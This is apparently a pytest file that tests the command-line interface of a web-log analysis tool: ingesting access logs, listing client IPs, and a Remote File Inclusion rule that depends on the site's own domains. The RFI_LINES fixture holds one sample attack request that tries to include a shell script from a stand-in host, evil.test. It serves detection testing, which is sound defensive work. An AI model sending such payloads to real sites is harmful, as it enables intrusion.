"""Tests for the command line interface.

These check the contract a user sees — exit codes and what is printed — rather
than internals, which the layers below already cover.
"""

from __future__ import annotations

from pathlib import Path

import pytest
from typer.testing import CliRunner

from logarc.case import Case
from logarc.cli.main import app

runner = CliRunner()

LINES = [
    '203.0.113.5 - - [10/Oct/2020:13:55:36 +0000] "GET / HTTP/1.1" 200 2326 "-" "curl/8.0"',
    '203.0.113.5 - - [10/Oct/2020:13:55:40 +0000] "GET /admin HTTP/1.1" 404 0 "-" "curl/8.0"',
    '198.51.100.9 - - [10/Oct/2020:13:56:00 +0000] "POST /login HTTP/1.1" 302 0 "-" "curl/8.0"',
]


@pytest.fixture
def log(tmp_path: Path) -> Path:
    path = tmp_path / "access.log"
    path.write_text("\n".join(LINES) + "\n", encoding="utf-8")
    return path


def test_every_severity_has_a_colour_to_print_it_in() -> None:
    """The table is indexed, not `.get`, so a severity missing from it raises
    `KeyError` — and it raises in `analyze` and `list-ips`, at the moment there
    is finally something to report. Adding a level to the enum should fail here
    instead, where it costs a line."""
    from logarc.cli.main import _SEVERITY_STYLE
    from logarc.core.activity import Severity

    assert set(_SEVERITY_STYLE) == set(Severity)


def test_ingest_reports_what_it_stored(log: Path, tmp_path: Path) -> None:
    result = runner.invoke(app, ["ingest", str(log), "--case", str(tmp_path / "case")])

    assert result.exit_code == 0
    assert "3" in result.stdout
    assert "apache-combined" in result.stdout


def test_ingest_creates_a_usable_case(log: Path, tmp_path: Path) -> None:
    case = tmp_path / "case"
    runner.invoke(app, ["ingest", str(log), "--case", str(case)])

    assert (case / "case.json").exists()
    assert (case / "ip_index.parquet").exists()


def test_ingest_of_an_unrecognisable_file_fails_with_a_useful_message(
    tmp_path: Path,
) -> None:
    path = tmp_path / "notes.txt"
    path.write_text("just some notes\n", encoding="utf-8")

    result = runner.invoke(app, ["ingest", str(path), "--case", str(tmp_path / "case")])

    assert result.exit_code != 0
    assert "--format" in result.output


def test_ingest_of_a_missing_file_fails_cleanly(tmp_path: Path) -> None:
    result = runner.invoke(
        app, ["ingest", str(tmp_path / "gone.log"), "--case", str(tmp_path / "case")]
    )

    assert result.exit_code != 0
    assert "Traceback" not in result.output


def test_ingest_refuses_to_overwrite_an_existing_case(log: Path, tmp_path: Path) -> None:
    case = tmp_path / "case"
    runner.invoke(app, ["ingest", str(log), "--case", str(case)])

    result = runner.invoke(app, ["ingest", str(log), "--case", str(case)])

    assert result.exit_code != 0
    assert "already exists" in result.output


def test_list_ips_shows_each_client(log: Path, tmp_path: Path) -> None:
    case = tmp_path / "case"
    runner.invoke(app, ["ingest", str(log), "--case", str(case)])

    result = runner.invoke(app, ["list-ips", "--case", str(case)])

    assert result.exit_code == 0
    assert "203.0.113.5" in result.stdout
    assert "198.51.100.9" in result.stdout


def test_list_ips_honours_the_limit(log: Path, tmp_path: Path) -> None:
    case = tmp_path / "case"
    runner.invoke(app, ["ingest", str(log), "--case", str(case)])

    result = runner.invoke(app, ["list-ips", "--case", str(case), "--limit", "1"])

    assert "203.0.113.5" in result.stdout
    assert "198.51.100.9" not in result.stdout


def test_list_ips_rejects_an_unknown_sort_key(log: Path, tmp_path: Path) -> None:
    case = tmp_path / "case"
    runner.invoke(app, ["ingest", str(log), "--case", str(case)])

    result = runner.invoke(app, ["list-ips", "--case", str(case), "--sort", "sideways"])

    assert result.exit_code != 0
    assert "Traceback" not in result.output


def test_list_ips_on_a_missing_case_fails_cleanly(tmp_path: Path) -> None:
    result = runner.invoke(app, ["list-ips", "--case", str(tmp_path / "nope")])

    assert result.exit_code != 0
    assert "Traceback" not in result.output


def test_formats_lists_what_can_be_parsed() -> None:
    result = runner.invoke(app, ["formats"])

    assert result.exit_code == 0
    assert "apache-combined" in result.stdout


def test_version_is_reported() -> None:
    result = runner.invoke(app, ["--version"])

    assert result.exit_code == 0
    assert "logarc" in result.stdout


# -- the site's own domains, which one rule needs and nothing else does -------
#
# The GUI asks this after a scan. These exist so the command line can answer it
# too — the project's rule is that anything the GUI can do is scriptable, and a
# rule that only fires for people who clicked a dialog would break it.

RFI_LINES = [
    "203.0.113.7 - - [10/Oct/2020:14:00:00 +0000] "
    '"GET /page?url=https://evil.test/shell.txt HTTP/1.1" 200 120 "-" "curl/8.0"',
    "203.0.113.7 - - [10/Oct/2020:14:00:05 +0000] "
    '"GET /page?url=https://shop.test/help HTTP/1.1" 200 120 "-" "curl/8.0"',
]


@pytest.fixture
def rfi_log(tmp_path: Path) -> Path:
    path = tmp_path / "rfi.log"
    path.write_text("\n".join(RFI_LINES) + "\n", encoding="utf-8")
    return path


def test_ingest_can_be_told_the_site_s_domains(rfi_log: Path, tmp_path: Path) -> None:
    case = tmp_path / "case"

    result = runner.invoke(
        app,
        ["ingest", str(rfi_log), "--case", str(case), "--site-host", "shop.test"],
    )

    assert result.exit_code == 0, result.output
    assert Case.open(case).site_hosts == ("shop.test",)


def test_site_hosts_shows_what_a_case_was_told(rfi_log: Path, tmp_path: Path) -> None:
    case = tmp_path / "case"
    runner.invoke(app, ["ingest", str(rfi_log), "--case", str(case)])

    runner.invoke(app, ["site-hosts", "--case", str(case), "--set", "shop.test"])
    shown = runner.invoke(app, ["site-hosts", "--case", str(case)])

    assert shown.exit_code == 0, shown.output
    assert "shop.test" in shown.output


def test_a_case_that_was_never_asked_says_so(rfi_log: Path, tmp_path: Path) -> None:
    """Rather than printing an empty list, which reads as a bug."""
    case = tmp_path / "case"
    runner.invoke(app, ["ingest", str(rfi_log), "--case", str(case)])

    shown = runner.invoke(app, ["site-hosts", "--case", str(case)])

    assert shown.exit_code == 0, shown.output
    assert "no domains" in shown.output.lower()


def test_the_answer_changes_what_analyze_reports(rfi_log: Path, tmp_path: Path) -> None:
    """**The end-to-end claim of this whole feature.**

    The same two requests, the same case, the same rules. Unanswered, the
    off-site fetch reads as ordinary browsing; answered, it is a finding — and
    the request to the reader's own site stays ordinary either way.
    """
    case = tmp_path / "case"
    runner.invoke(app, ["ingest", str(rfi_log), "--case", str(case)])

    # A wide terminal, because the activity table wraps a long rule name across
    # four lines and the assertion below is about the name, not the layout.
    wide = {"COLUMNS": "200"}
    analyze = ["analyze", "--case", str(case), "--ip", "203.0.113.7"]

    before = runner.invoke(app, analyze, env=wide)
    runner.invoke(app, ["site-hosts", "--case", str(case), "--set", "shop.test"])
    after = runner.invoke(app, analyze, env=wide)

    assert before.exit_code == 0 and after.exit_code == 0
    assert "Remote File Inclusion" not in before.output
    assert "Remote File Inclusion" in after.output


def test_clearing_the_domains_makes_the_rule_quiet_again(rfi_log: Path, tmp_path: Path) -> None:
    case = tmp_path / "case"
    runner.invoke(app, ["ingest", str(rfi_log), "--case", str(case), "--site-host", "shop.test"])

    runner.invoke(app, ["site-hosts", "--case", str(case), "--clear"])

    assert Case.open(case).site_hosts == ()
    assert (
        "Remote File Inclusion"
        not in runner.invoke(
            app, ["analyze", "--case", str(case), "--ip", "203.0.113.7"], env={"COLUMNS": "200"}
        ).output
    )
